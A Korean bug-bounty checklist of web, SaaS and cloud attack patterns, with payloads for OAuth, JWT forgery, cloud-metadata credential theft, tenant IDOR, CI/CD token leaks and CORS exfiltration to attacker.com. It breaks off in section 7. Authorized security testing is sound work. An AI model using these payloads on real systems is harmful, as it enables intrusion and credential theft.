# Cloud / SaaS / Web Attack Patterns — 2025-2026

**목적**: 웹/SaaS 버그바운티 헌터 실전 체크리스트 (bugcrowd / h1 / intigriti)
**갱신일**: 2026-04-16
**대상 플랫폼**: Bugcrowd, HackerOne, Intigriti, YesWeHack
**커버리지**: OAuth/OIDC, JWT, SSRF→Cloud IAM, Webhook, SaaS IDOR, CI/CD, CORS/CSP, Top Reports, PoC 스니펫, VRT 매핑

---

## 목차

1. [OAuth / OIDC 공격 (최신)](#1-oauth--oidc-공격-최신)
2. [JWT 신규 패턴](#2-jwt-신규-패턴)
3. [SSRF → Cloud IAM 체인](#3-ssrf--cloud-iam-체인)
4. [Webhook / 3rd-party Integration](#4-webhook--3rd-party-integration)
5. [SaaS 특화 IDOR / Tenant Isolation](#5-saas-특화-idor--tenant-isolation)
6. [CI/CD / DevOps 노출](#6-cicd--devops-노출)
7. [CORS / CSP 실전 우회](#7-cors--csp-실전-우회)
8. [Recent H1/Bugcrowd Top Reports](#8-recent-h1bugcrowd-top-reports)
9. [실전 PoC 스니펫](#9-실전-poc-스니펫)
10. [Gate 1 VRT 매핑](#10-gate-1-vrt-매핑)

---

## 1. OAuth / OIDC 공격 (최신)

### 소스
- Doyensec Blog (2025-01-30): https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html
- 0xn3va Cheat Sheet: https://0xn3va.gitbook.io/cheat-sheets/web-application/oauth-2.0-vulnerabilities
- PortSwigger Top 10 Web Hacking Techniques 2025 (항목 8): https://portswigger.net/research/top-10-web-hacking-techniques-of-2025

---

### 1-A. State 파라미터 바인딩 미검증 (CSRF → ATO)

**원리**: `state` 파라미터가 없거나, 고정 값이거나, 서버 측에서 검증하지 않으면 CSRF를 통해 공격자 계정으로 피해자를 바인딩할 수 있다.

**테스트 체크리스트**:
- `state` 파라미터 제거 → 흐름이 진행되면 VULNERABLE
- `state=STATIC` 고정값 → 흐름 반복 시 동일 값이면 VULNERABLE
- `state`가 있어도 서버가 검증하지 않으면 → VULNERABLE (Burp Repeater로 state 변조 후 재전송)

**공격 흐름 (ATO)**:
1. 공격자가 `state` 없이 Authorization URL 생성
2. 피해자를 해당 URL로 유도
3. 피해자의 `code`가 공격자 콜백으로 전달됨
4. 공격자가 code 교환 → 피해자 세션 탈취

**한국어 요약**: state 없는 OAuth = CSRF 취약. 특히 "Connect Account" / "Link Social" 기능에서 ATO로 직결. 버그바운티 P2~P1.

---

### 1-B. PKCE bypass / code_challenge Downgrade

**원리**: Authorization Server가 `code_verifier` 검증을 실제로 강제하지 않거나, `code_challenge_method=plain`을 허용하는 경우 PKCE가 무력화된다.

**테스트**:
```
# 1. PKCE 없이 Authorization Code 요청
GET /oauth/authorize?
  response_type=code
  &client_id=CLIENT_ID
  &redirect_uri=https://app.example.com/callback
  &scope=openid profile
  # code_challenge 파라미터 완전 제거

# 2. code 획득 후 code_verifier 없이 token endpoint 요청
POST /oauth/token
  grant_type=authorization_code
  &code=OBTAINED_CODE
  &client_id=CLIENT_ID
  &redirect_uri=https://app.example.com/callback
  # code_verifier 파라미터 완전 제거

# 취약: 200 OK + access_token 반환
# 안전: 400 Bad Request "code_verifier required"
```

**Downgrade 공격**: `code_challenge_method=plain`이 허용되면 공격자가 중간에서 코드를 가로채 `code_verifier=code_challenge` 값으로 직접 교환 가능.

**한국어 요약**: PKCE는 "있다"는 것으로 충분하지 않음. 서버가 실제로 verifier를 검증하는지 확인 필수. 특히 native/mobile app 타겟에서 흔한 미구현 패턴.

---

### 1-C. response_mode=fragment 토큰 누출

**원리**: `response_mode=fragment`로 설정되면 access_token이 URL fragment(`#`)에 포함되어 Referer 헤더, 브라우저 히스토리, 서버 로그에 노출될 수 있다.

**테스트**:
```
GET /oauth/authorize?
  response_type=token
  &response_mode=fragment
  &client_id=CLIENT_ID
  &redirect_uri=https://app.example.com/callback
```

응답 redirect URL이 `https://app.example.com/callback#access_token=TOKEN&...` 형태이면 취약.

**추가 체크**: redirect_uri가 `http://` (비암호화)이거나 open redirect가 있는 경우 fragment가 공격자 서버로 전달 가능.

**PortSwigger 2025 발견**: localhost OAuth origins 남용 — 모바일 앱의 production에 허용된 loopback redirect를 악용해 로컬 악성 서버가 토큰 자동 캡처.

---

### 1-D. Mutable Claim 기반 계정 탈취

**원리**: 서버가 불변 식별자(`sub`)가 아닌 가변 필드(`email`, `username`)로 사용자를 매핑하면 이메일 변경 후 재인증으로 타 계정 탈취 가능.

**공격 흐름**:
1. 피해자의 이메일 주소를 알고 있음
2. 공격자 IdP 계정에서 이메일을 피해자 이메일로 변경
3. "Login with [Provider]" 로그인 → 타겟 앱이 email 기반으로 피해자 계정과 매핑
4. 피해자 계정 탈취

**테스트 대상**: "Sign in with Google/Microsoft/GitHub" 기능이 있는 앱에서 소셜 계정 이메일을 변경한 뒤 재인증.

---

### 1-E. Redirect URI 우회 패턴 (2025 실전)

공격자가 자신의 도메인으로 code를 리디렉션시키는 우회 기법들:

| 기법 | 예시 | 우회 조건 |
|------|------|----------|
| 서브도메인 허용 | `evil.app.example.com` | 와일드카드 `*.example.com` 허용 시 |
| 경로 접두사 허용 | `app.example.com/callback/../../../evil` | 경로만 prefix 검사 시 |
| 쿼리스트링 오염 | `app.example.com/callback?redirect=evil.com` | open redirect와 조합 |
| HTTP Parameter Pollution | `redirect_uri=good.com&redirect_uri=evil.com` | 복수 파라미터 처리 취약 시 |
| 로컬호스트 화이트리스트 | `localhost:1337` | production에 localhost 허용 시 |
| Regex 우회 | `app.example.com.evil.com` | 도메인 끝 검증 없을 때 |

---

### 1-F. Scope 업그레이드 공격

**원리**: Authorization Server가 token 요청 시 `scope` 파라미터를 검증하지 않으면, 공격자가 처음 승인된 범위 이상의 권한을 획득할 수 있다.

**테스트**:
```
# 최초 authorize: scope=read
# token 교환 시 scope 확장 시도
POST /oauth/token
  grant_type=authorization_code
  &code=CODE
  &scope=read write admin    ← 확장된 scope
```

취약: 응답 token이 `write`, `admin` scope를 포함 → P2.

---

## 2. JWT 신규 패턴

### 소스
- PortSwigger Web Security Academy: https://portswigger.net/web-security/jwt
- PortSwigger Lab (jku injection): https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection
- Red Sentry 2026: https://redsentry.com/resources/blog/jwt-vulnerabilities-list-2026-security-risks-mitigation-guide
- IntelligenceX 2025: https://blog.intelligencex.org/jwt-vulnerabilities-testing-guide-2025-algorithm-confusion

### 2025 주요 CVE

| CVE | 설명 | 영향 |
|-----|------|------|
| CVE-2025-4692 | Cloud platform JWT parser algorithm confusion flaw | Critical |
| CVE-2025-30144 | Library validation bypass (signature skip) | High |
| CVE-2025-27371 | ECDSA public key recovery enabling token forgery | Critical |

---

### 2-A. kid 파라미터 혼동 (Path Traversal / SQL Injection)

**원리**: JWT 헤더의 `kid` 파라미터는 서버가 서명 검증에 사용할 키를 식별하는 데 쓰인다. 이 값이 파일 경로나 DB 쿼리에 직접 삽입되면 path traversal 또는 SQL injection이 가능하다.

**Path Traversal 공격**:
```json
// JWT 헤더 변조
{
  "alg": "HS256",
  "kid": "../../dev/null"
}
// dev/null은 빈 파일 → 빈 문자열로 서명
// 공격자가 빈 문자열("")로 서명한 JWT가 검증 통과
```

**SQL Injection 공격**:
```json
{
  "alg": "HS256",
  "kid": "' UNION SELECT 'attacker_secret' -- "
}
// DB에서 kid로 키를 조회 시 SQL injection
// 반환값 'attacker_secret'으로 서명한 토큰이 유효
```

**테스트 도구**: `jwt_tool.py -T` (tamper mode), Burp JWT Editor 확장

---

### 2-B. jku / x5u SSRF (악성 JWK Set 호스팅)

**원리**: `jku` (JSON Web Key Set URL) 헤더가 검증 없이 외부 URL에서 공개키를 가져올 경우, 공격자가 자신의 서버에 악성 JWKS를 호스팅하고 임의의 JWT를 서명할 수 있다.

**공격 단계**:
```bash
# 1. 공격자 RSA 키쌍 생성
openssl genrsa -out attacker.key 2048
openssl rsa -in attacker.key -pubout -out attacker.pub

# 2. 악성 JWKS 서버 구동 (공격자 제어 도메인)
# https://attacker.com/.well-known/jwks.json 에 공개키 노출

# 3. JWT 헤더에 jku 주입
{
  "alg": "RS256",
  "jku": "https://attacker.com/.well-known/jwks.json",
  "kid": "attacker-key-id"
}

# 4. 공격자 개인키로 서명 → 서버가 jku에서 공개키 fetch → 검증 통과
```

**SSRF 연계**: `jku`가 내부 URL을 허용하는 경우 SSRF 벡터로 활용 가능.
- `jku: http://169.254.169.254/latest/meta-data/` (AWS IMDSv1)
- `jku: http://internal-jwks-service/keys`

**우회 기법**: URL 파싱 차이 악용
- `https://trusted.com@attacker.com/jwks.json`
- `https://trusted.com.attacker.com/jwks.json`
- `https://trusted.com%2F%2Fattacker.com/jwks.json`

---

### 2-C. JWE alg='none' / Algorithm Confusion

**alg=none 우회**:
```python
# 표준 none 거부 → 대소문자 변형으로 우회
variations = ["none", "None", "NONE", "nOnE", "NoNe"]

# 페이로드 구조: header.payload. (시그니처 없음, 마지막 점 필수)
import base64, json

header = base64.urlsafe_b64encode(
    json.dumps({"alg": "None", "typ": "JWT"}).encode()
).rstrip(b'=').decode()

payload = base64.urlsafe_b64encode(
    json.dumps({"sub": "admin", "role": "admin"}).encode()
).rstrip(b'=').decode()

forged_token = f"{header}.{payload}."  # 빈 시그니처
```

**Algorithm Confusion (RS256 → HS256)**:
```python
# RS256(비대칭) 서버가 HS256으로 검증할 경우:
# 공개키(PEM)를 HMAC secret으로 사용해 위조 가능

# 단계:
# 1. 서버 공개키 획득 (/.well-known/jwks.json 또는 인증서에서 추출)
# 2. alg를 RS256 → HS256으로 변경
# 3. 공개키 PEM 문자열을 HMAC-SHA256 secret으로 사용해 서명
# 4. 서버는 HS256으로 검증 시 공개키(=HMAC secret)로 검증 → 통과
```

---

### 2-D. jwk 헤더 파라미터 인젝션

**원리**: `jwk` 헤더에 공격자 공개키를 직접 임베드. 서버가 화이트리스트 없이 헤더 내 키를 신뢰하면 통과.

```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "ATTACKER_MODULUS_BASE64URL",
    "e": "AQAB",
    "kid": "injected-key"
  }
}
// 공격자 개인키로 서명 → 서버가 헤더 내 공개키로 검증 → 통과
```

---

### 2-E. Nimbus JOSE / jose4j 라이브러리 패턴

**알려진 취약 패턴**:
- `JWTParser.parse()` 후 타입 미검증 → Signed/Encrypted 혼용 가능
- `JWKSet.load(URL)` timeout/redirect 미검증 → SSRF
- 만료(`exp`) 검증 없이 `JWTClaimsSet.getClaims()` 직접 사용

**방어 확인용 코드 패턴 (취약)**:
```java
// 취약: alg 검증 없음
JWSVerifier verifier = new RSASSAVerifier(publicKey);
signedJWT.verify(verifier);  // alg confusion 가능

// 안전: 명시적 alg 화이트리스트
ConfigurableJWTProcessor<SecurityContext> proc = new DefaultJWTProcessor<>();
proc.setJWSKeySelector(new JWSVerificationKeySelector<>(JWSAlgorithm.RS256, keySource));
```

---

## 3. SSRF → Cloud IAM 체인

### 소스
- Hacking The Cloud: https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/
- HackTricks Cloud SSRF: https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf
- Medium (IMDSv2 limits): https://medium.com/@harshagv/uncovering-cloud-security-flaws-how-ssrf-exploits-imdsv2-limitations-in-aws-75bd4201786b
- PortSwigger Top 10 2025 #3 (Blind SSRF via redirect loop): https://portswigger.net/research/top-10-web-hacking-techniques-of-2025

---

### 3-A. AWS EC2 — IMDSv1 (아직 93% 미패치)

```bash
# IAM role 존재 확인
curl http://169.254.169.254/latest/meta-data/iam/

# 역할 이름 조회
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 자격증명 추출 (역할명 = 위 응답값)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# 응답: {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}

# SSRF 경유 (앱이 proxy 역할)
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
```

---

### 3-B. AWS EC2 — IMDSv2 (2026 현재 기본값이지만 우회 가능)

**IMDSv2 작동 원리**: PUT으로 세션 토큰 획득 → 후속 GET에 토큰 포함.

```bash
# SSRF 앱이 PUT 요청을 포워딩할 수 있는 경우 IMDSv2도 탈취 가능
# Step 1: 토큰 획득 (PUT 포워딩 SSRF)
TOKEN=$(curl -X PUT \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "https://target.com/proxy?url=http://169.254.169.254/latest/api/token")

# Step 2: 자격증명 조회
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "https://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
```

**컨테이너 hop limit 제한**: EKS Pod 내부에서 EC2 IMDS 직접 접근 시 hop count가 1이면 컨테이너 → EC2 메타데이터 직접 요청이 차단됨. 단 hop limit이 2 이상이면 통과.

**컨테이너 전용 자격증명 엔드포인트**:
```bash
# ECS / Fargate
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"

# EKS IRSA (Pod에 WebIdentity 토큰 마운트)
cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token   # JWT
# → STS AssumeRoleWithWebIdentity로 IAM Role 획득
```

---

### 3-C. Lambda 환경변수 / 런타임 API 누출

```bash
# proc fs를 통한 환경변수 누출 (SSRF + path traversal)
curl "https://target.com/fetch?url=file:///proc/self/environ"

# Lambda 런타임 API (localhost 접근, SSRF 필요)
curl "http://localhost:9001/2018-06-01/runtime/invocation/next"
# 응답: 현재 invocation의 event 데이터 (트리거 페이로드 포함)

# Lambda 환경 변수 직접 노출 경로
# AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
# → /proc/self/environ 또는 /proc/1/environ
```

---

### 3-D. GCP 인스턴스 메타데이터

```bash
# GCP 메타데이터 (필수 헤더 요구)
curl "http://metadata.google.internal/computeMetadata/v1/" \
  -H "Metadata-Flavor: Google"

# 서비스 계정 토큰
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# 프로젝트 정보
curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" \
  -H "Metadata-Flavor: Google"

# SSRF 우회: Metadata-Flavor 헤더를 앱이 포워딩하는 경우
# 일부 앱은 모든 요청 헤더를 그대로 포워딩 → 헤더 인젝션으로 우회 가능
```

**AWS vs GCP 차이점**:
| 항목 | AWS | GCP |
|------|-----|-----|
| 주소 | 169.254.169.254 | metadata.google.internal |
| 필수 헤더 | X-aws-ec2-metadata-token (v2) | Metadata-Flavor: Google |
| 토큰 TTL | 최대 21600초 | 자동 갱신 |
| 자격증명 경로 | /iam/security-credentials/ | /service-accounts/default/token |

---

### 3-E. Azure 인스턴스 메타데이터

```bash
curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata:true"

# 관리 ID 토큰 (IMDS 경유)
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata:true"
```

---

### 3-F. 2025 신기법 — Blind SSRF Visibility (PortSwigger #3)

**기법 (Shubs, 2025)**: HTTP redirect loop을 이용해 Blind SSRF를 가시화.

**원리**: 타겟 서버가 SSRF 결과를 응답에 포함하지 않아도, 공격자 서버에 redirect loop을 구성하면 서버의 다음 요청에 내부 응답이 포함됨.

```
공격자 서버: /redirect → 301 Location: http://internal-host/secret
공격자 서버: /secret → 내용 기록
→ 타겟 서버가 redirect를 따라가며 내부 응답을 공격자에게 노출
```

---

## 4. Webhook / 3rd-party Integration

### 소스
- Hookdeck Security Guide: https://hookdeck.com/webhooks/guides/webhook-security-vulnerabilities-guide
- webhooks.fyi replay prevention: https://webhooks.fyi/security/replay-prevention
- HackerOne API webhook docs: https://api.hackerone.com/webhooks/

---

### 4-A. HMAC 서명 검증 우회

**패턴 1: Body 파싱 전 변환**
```python
# 취약: body를 파싱 후 서명 검증
body_dict = json.loads(request.body)
computed_sig = hmac.new(SECRET, json.dumps(body_dict).encode()).hexdigest()
# json.dumps()가 key 순서를 바꾸면 서명 불일치 → 검증 로직이 스킵될 수 있음

# 공격: body를 raw bytes가 아닌 파싱된 형태로 재직렬화하면
# 서명이 달라져도 취약한 구현은 "파싱 성공 = 검증 성공"으로 처리
```

**패턴 2: 타이밍 공격 (Timing Attack)**
```python
# 취약: == 비교 (시간 차이로 secret 유추 가능)
if request.headers['X-Signature'] == computed_sig:
    pass

# 안전: timing-safe 비교
import hmac
if hmac.compare_digest(request.headers['X-Signature'], computed_sig):
    pass
```

**패턴 3: 서명 헤더 완전 부재 처리**
```python
# 취약: X-Signature 헤더가 없으면 검증 스킵
sig = request.headers.get('X-Signature', None)
if sig and not verify(sig, body):
    return 403
# → 헤더를 아예 제거하면 검증 로직 우회
```

---

### 4-B. Replay Attack (타임스탬프 미검증)

**공격 흐름**:
1. 정상 webhook 요청 캡처 (유효한 HMAC 서명 포함)
2. 수 시간/수 일 후 동일 요청 재전송
3. 서버가 타임스탬프 검증 없으면 이중 처리

**테스트**:
```bash
# 정상 요청 캡처 후 replay
curl -X POST https://target.com/webhook \
  -H "X-Signature: sha256=CAPTURED_VALID_SIG" \
  -H "X-Timestamp: 1700000000" \   # 과거 타임스탬프
  -d '{"event":"payment.success","amount":1000}'
```

**취약 기준**: 5분 이상 된 타임스탬프의 요청을 수락하면 VULNERABLE.

---

### 4-C. URL Rewrite / Redirect 남용 (Zapier/Make/n8n 스타일)

**원리**: Zapier, Make(구 Integromat), n8n 같은 자동화 플랫폼이 webhook URL을 생성할 때, 공격자가 자신의 플랫폼 계정을 통해 피해 조직의 webhook을 수신할 수 있는 경우가 있다.

**테스트 포인트**:
- webhook URL이 자동화 플랫폼 경유인지 확인
- 플랫폼 계정 공유/이전 시 이전 URL의 수신자가 변경되는지
- `redirect_to` 파라미터가 있는 경우 SSRF 벡터 가능성

**n8n SSRF (CVE-2024-21661 등)**: n8n의 HTTP Request 노드가 내부 네트워크에 접근 가능한 경우 SSRF.

---

### 4-D. Webhook Secret 노출

**흔한 노출 경로**:
- GitHub 공개 저장소에 `.env` 파일 커밋
- CI/CD 빌드 로그에 secret 출력
- API 응답에 webhook secret이 평문 포함 (IDOR + secret 열람)
- 팀 설정 UI에서 secret이 `value` 속성에 평문 노출 (DevTools로 열람)

---

## 5. SaaS 특화 IDOR / Tenant Isolation

### 소스
- OnSecurity 실전 사례: https://onsecurity.io/article/pentest-files-how-a-single-http-header-unlocked-every-customers-data/
- HackerOne Top GraphQL Reports: https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPGRAPHQL.md
- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html

---

### 5-A. Tenant Header Confusion (실전 사례 확인)

**2025 실전 사례 (OnSecurity)**: 멀티테넌트 SaaS에서 `Tenantid` 헤더를 클라이언트가 제어 가능하여 모든 조직 데이터 접근.

```http
POST /api/v1/Users/all_users
Authorization: Bearer ATTACKER_VALID_JWT
Tenantid: 1    ← 정상 (자신의 tenant)

# 변조:
Tenantid: 2    ← 다른 조직 데이터 열람
Tenantid: 3
Tenantid: 100  ← 순차 열거
```

**테스트 대상 헤더 목록**:
```
X-Tenant-ID
X-Organization-ID
X-Workspace-ID
X-Account-ID
TenantId
Tenantid
X-Customer-ID
X-Client-ID
X-Org
X-Team-ID
```

**한국어 요약**: JWT에 tenant 정보가 포함되어 있어도, 별도 헤더로 테넌트를 오버라이드할 수 있는지 확인. 순차 정수 ID라면 전체 tenant 열거 가능 → Critical.

---

### 5-B. UUIDv7 예측 / 타이밍 기반 추론

**UUIDv7 구조**: 처음 48비트가 밀리초 타임스탬프. 생성 시간을 알면 범위 내에서 브루트포스 가능.

```python
import uuid, time

# UUIDv7 생성 시간 추론
def extract_timestamp(uuid_str):
    u = uuid.UUID(uuid_str)
    # UUIDv7: 첫 48비트가 Unix 타임스탬프(ms)
    ts_ms = u.int >> 80
    return ts_ms / 1000  # Unix timestamp in seconds

# 특정 시간대의 UUID 범위 브루트포스
target_time_ms = int(time.time() * 1000) - 60000  # 1분 전
for offset in range(0, 60000, 100):  # 1분간 100ms 단위
    candidate_prefix = (target_time_ms + offset) << 80
    # → ID 범위 추정 후 API 호출 시도
```

**한국어 요약**: UUIDv4는 추측 불가능하지만 UUIDv7은 시간 기반 → 생성 시간을 알면 범위 내 브루트포스 가능. 특히 "자원 생성 직후 IDOR 탐색" 시나리오에서 유효.

---

### 5-C. GraphQL Introspection + Batching 남용

**Introspection 쿼리 (숨겨진 필드 탐색)**:
```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        type { name kind }
        args { name type { name kind } }
      }
    }
  }
}
```

**Introspection 비활성화 우회 (field suggestion 활용)**:
```graphql
# 오타를 통한 자동완성 힌트 유도
{ usr { id } }
# 응답: "Did you mean 'user'?"
# → 필드명 유추 가능
```

**Batching 남용 (rate limit 우회)**:
```graphql
# 단일 요청에 다수 mutation 포함 → rate limit per-request 우회
mutation {
  login1: login(email: "admin@example.com", password: "password1") { token }
  login2: login(email: "admin@example.com", password: "password2") { token }
  login3: login(email: "admin@example.com", password: "password3") { token }
  # ... 100개까지 가능
}
```

**IDOR via GraphQL**:
```graphql
# 사용자 ID 직접 지정
query {
  user(id: "1337") {
    email
    role
    paymentMethods { cardNumber cvv }
  }
}

# 자신 → 타인 ID로 변경하여 접근 제어 확인
```

**HackerOne 주요 GraphQL 사례**:
- Report #489146 (HackerOne, 1028 upvotes): 사용자 데이터 + 프로그램 메타데이터 노출
- Report #2122671 (HackerOne, $12,500): mutation으로 타인 인증서 삭제
- Report #2207248 (Shopify, $5,000): BillingDocument 쿼리 접근 제어 미흡
- Report #1864188 (EXNESS, $3,000): GraphQL endpoint SSRF

---

### 5-D. Tenant Isolation 체크리스트

```
[ ] JWT claim의 tenant ID vs 요청 파라미터/헤더 tenant ID 불일치 허용 여부
[ ] 다른 tenant의 오브젝트 ID를 자신의 세션으로 조회 가능한지
[ ] 멀티테넌트 DB에서 row-level 필터링(tenant_id=?) 적용 여부
[ ] 공유 오브젝트(template, public resource) 경유 cross-tenant 접근
[ ] Admin API가 tenant 범위를 초과하는지
[ ] 파일/이미지 업로드 경로에 tenant 격리 적용 여부 (path: /uploads/tenant_1/file.pdf → tenant_2로 변경)
[ ] Elasticsearch/OpenSearch 인덱스 per-tenant 격리 여부
[ ] 웹소켓 subscription에서 tenant 격리 적용 여부
```

---

## 6. CI/CD / DevOps 노출

### 소스
- StepSecurity Incidents (2024-2025): https://www.stepsecurity.io/incidents
- GitHub Actions OIDC Docs: https://docs.github.com/en/actions/concepts/security/openid-connect
- BinarySecurity GitHub Actions Part 2 (2025-09): https://www.binarysecurity.no/posts/2025/09/securing-gh-actions-part2
- ArgoCD CVE-2025-55190: https://thecyberexpress.com/critical-argo-cd-api-flaw-cve-2025-55190/
- tj-actions supply chain (CVE-2025-30066): https://thehackernews.com/2025/03/github-action-compromise-puts-cicd.html

---

### 6-A. GitHub Actions OIDC sub claim 조작

**OIDC sub claim 구조**:
```
repo:ORG/REPO:environment:ENVIRONMENT_NAME
repo:ORG/REPO:ref:refs/heads/main
repo:ORG/REPO:pull_request
```

**취약 패턴 1: pull_request entity type**
```yaml
# Cloud Provider의 federated credential 조건이 아래와 같으면:
subject: "repo:any-org/any-repo:pull_request"

# → 해당 repo에 PR을 올릴 수 있는 모든 contributor가 AWS/Azure 자격증명 획득 가능
```

**취약 패턴 2: organization claim 미포함**
```yaml
# 취약: repo name만 확인
subject: "repo:*:environment:production"
# → 다른 org의 같은 이름 레포에서도 일치

# 안전: org + repo + environment 모두 명시
subject: "repo:SPECIFIC_ORG/SPECIFIC_REPO:environment:production"
```

**실전 공격 (BinarySecurity 2025)**:
```hcl
# Terraform plan 인젝션 (contributor가 수행)
output "azure_token" {
    value = base64encode(file("/home/runner/.azure/msal_token_cache.json"))
}
# pull_request 트리거 workflow에서 terraform plan이 실행되면
# plan output에 Azure 토큰이 평문 포함 → 빌드 로그에서 추출
```

---

### 6-B. GitHub Actions 시크릿 노출 (2025 주요 사례)

**CVE-2025-30066 (tj-actions/changed-files)**:
- 영향: 23,000+ 레포지토리
- 공격: 악성 커밋 후 버전 태그 소급 변경
- 페이로드: base64 인코딩 Python 스크립트가 Runner 메모리에서 시크릿 추출
- 탈취 데이터: AWS Access Key, GitHub PAT, npm 토큰, RSA 키

**Pwn Request 패턴**:
```yaml
# 취약: pull_request_target + 외부 코드 체크아웃
on:
  pull_request_target:
    types: [opened]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← 취약
      - run: ./scripts/test.sh  # 공격자 코드 실행
```

**탐지 포인트**:
- `pull_request_target` + 외부 ref checkout 조합
- `workflow_run` 트리거 + 아티팩트 기반 시크릿 전달
- 빌드 로그에서 `***` 마스킹이 적용되지 않은 값

---

### 6-C. ArgoCD / Helm 노출 UI

**CVE-2025-55190 (ArgoCD)**:
- 영향 버전: 2.2.0-rc1 이상 (패치: v3.1.2, v3.0.14, v2.14.16, v2.13.9)
- 취약점: API 토큰 소지자가 /api/v1/repositories에서 Helm 차트 저장소 자격증명 추출 가능
- 심각도: Critical (자격증명 노출)

**비인증 접근 체크**:
```bash
# ArgoCD API server 노출 확인
curl -k https://ARGOCD_HOST/api/v1/settings  # 인증 없이 접근 가능?
curl -k https://ARGOCD_HOST/api/v1/applications  # 앱 목록 노출?

# Helm repository secret 추출 (토큰 있는 경우)
curl -k https://ARGOCD_HOST/api/v1/repositories \
  -H "Authorization: Bearer TOKEN"
```

**탐지 우선순위**: 인터넷에 노출된 ArgoCD UI (shodan: `http.title:"Argo CD"`) → 인증 우회 또는 자격증명 노출 취약점.

---

### 6-D. Secrets in PR Diff / Build Log

```bash
# GitHub Actions 빌드 로그에서 시크릿 패턴 탐색
grep -E "AKIA[0-9A-Z]{16}" build.log     # AWS Access Key
grep -E "gh[pousr]_[A-Za-z0-9_]{36}" build.log  # GitHub Token
grep -E "sk-[A-Za-z0-9]{32,}" build.log  # API Keys

# PR diff에서 .env 파일 노출
git log --all --full-history -- "**/.env"
git show COMMIT_SHA:.env
```

---

## 7. CORS / CSP 실전 우회

### 소스
- PortSwigger CORS: https://portswigger.net/web-security/cors
- PortSwigger Top 10 2025 (관련 기법): https://portswigger.net/research/top-10-web-hacking-techniques-of-2025
- MDN COEP: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy
- Chrome COEP credentialless: https://developer.chrome.com/blog/coep-credentialless-origin-trial

---

### 7-A. CORS 오설정 패턴 (2025 기준)

**Origin Reflection (가장 흔한 패턴)**:
```http
# 요청
GET /api/user HTTP/1.1
Origin: https://evil.com

# 취약 응답
Access-Control-Allow-Origin: https://evil.com   ← 요청 origin 그대로 반사
Access-Control-Allow-Credentials: true

# 공격 페이로드
<script>
fetch('https://target.com/api/user', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://attacker.com/?d=' + JSON.stringify(data)));
</script>
```

**null Origin 우회**:
```http
# 일부 서버가 null origin을 허용
Origin: null

# 응답
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# 공격: sandboxed iframe을 통한 null origin 생성
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        srcdoc='<script>fetch("https://target.com/api/data", {credentials:"include"})...</script>'>
</iframe>
```

**신뢰된 서브도메인의 XSS 연계**:
```
target.com이 *.target.com의 CORS 요청 + 자격증명 허용
→ sub.target.com에 XSS가 있으면 → sub.target.com에서 target.com API 호출 가능
→ 자격증명 포함 cross-origin 요청 성공
```

**2025 CORS 신기법 (PortSwigger #10 관련)**: 혼합 콘텐츠(http) 서브도메인이 CORS에 허용된 경우, MITM 공격으로 http 서브도메인 응답 조작 → 자격증명 탈취 가능.

---

### 7-B. CSP strict-dynamic 우회

**strict-dynamic 의도**: 명시적으로 신뢰된 스크립트가 로드하는 스크립트도 신뢰.

**우회 기법 1: 신뢰된 스크립트 경유**
```javascript
// target.com이 신뢰한 스크립트(jQuery CDN)가
// 사용자 제어 데이터를 기반으로 새 스크립트를 로드하면
$.getScript(userControlledUrl);  // strict-dynamic 허용
```

**우회 기법 2: 허용된 도메인의 JSONP 엔드포인트**
```
CSP: script-src 'strict-dynamic' https://trusted-cdn.com
trusted-cdn.com에 JSONP 엔드포인트가 있으면:
<script src="https://trusted-cdn.com/jsonp?callback=alert(1)//"></script>
```

**우회 기법 3: PHP Warning 기반 Quirks Mode (PortSwigger Top 10 2025 #8)**
- PHP 경고 메시지가 HTML 최상단에 출력되면 브라우저가 Quirks Mode로 렌더링
- Quirks Mode에서 MIME 검증이 완화되어 스타일시트로 JS 실행 가능
- CSS Exfiltration으로 CSP 우회 → 네트워크 요청 없이 데이터 추출

---

### 7-C. COEP / COOP 우회 (2025 Chrome 변경점)

**COEP credentialless (Chrome 96+)**:
```http
Cross-Origin-Embedder-Policy: credentialless
# 효과: CORP 헤더 없는 크로스 오리진 리소스를 자격증명 없이 로드 가능
# cross-origin isolation 달성이 쉬워짐
```

**COOP 공격 벡터**:
```
COOP: same-origin → 팝업 간 window 참조 차단
COOP: same-origin-allow-popups → 부분 허용

취약 패턴: popup을 통한 OAuth 흐름에서 COOP가 없으면
opener.location을 통해 리디렉션 추적 가능
```

**XS-Leak via ETag (PortSwigger Top 10 2025 #6)**:
- ETag 응답 헤더의 길이를 크로스 오리진에서 측정
